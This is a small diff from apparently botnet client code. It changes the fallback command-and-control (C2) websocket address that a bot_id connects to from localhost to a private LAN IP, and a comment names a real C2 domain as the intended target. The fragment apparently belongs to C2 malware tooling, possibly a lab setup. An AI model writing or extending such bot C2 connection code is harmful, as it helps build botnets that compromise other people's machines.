@@ -62,7 +62,7 @@ async def bot_client(bot_id: str):
         c2_ip = socket.gethostbyname("localhost") # In real case: c2.domain.com
         C2_SERVERS = [f"ws://{c2_ip}:8000/ws/{bot_id}"]
     except:
-        C2_SERVERS = [f"ws://127.0.0.1:8000/ws/{bot_id}"]
+        C2_SERVERS = [f"ws://192.168.10.82:8000/ws/{bot_id}"]
 
     while True:
         try:
